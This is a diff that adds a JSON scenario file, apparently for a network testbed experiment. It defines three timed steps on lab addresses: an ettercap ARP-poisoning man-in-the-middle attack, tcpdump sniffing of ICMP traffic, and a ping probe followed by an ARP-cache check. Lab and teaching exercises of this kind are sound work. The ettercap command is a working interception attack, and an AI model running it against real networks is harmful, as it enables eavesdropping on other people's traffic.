@@ -1,0 +1,13 @@
+{
+  "Scenario": {
+    "task1": "attacker mitm startemit poisoning",
+    "task2": "when poisoning attacker sniff startemit sniffing",
+    "task3": "when sniffing wait 8 cache probe"
+  },
+  "Bindings": {
+    "mitm": "bash -c \"sudo timeout 45 ettercap -T -q -i $expeth(auth) -M arp:remote /10.1.2.2// /10.1.2.3// > /tmp/ettercap.txt 2>&1; true\"",
+    "sniff": "bash -c \"sudo timeout 30 tcpdump -nn -i $expeth(auth) icmp > /tmp/attacker-icmp2.txt 2>&1; true\"",
+    "probe": "bash -c \"ping -c 5 10.1.2.3 > /tmp/cache-ping-auth2.txt 2>&1; ip neigh > /tmp/cache-arp2.txt 2>&1\""
+  },
+  "Constraints": {}
+}
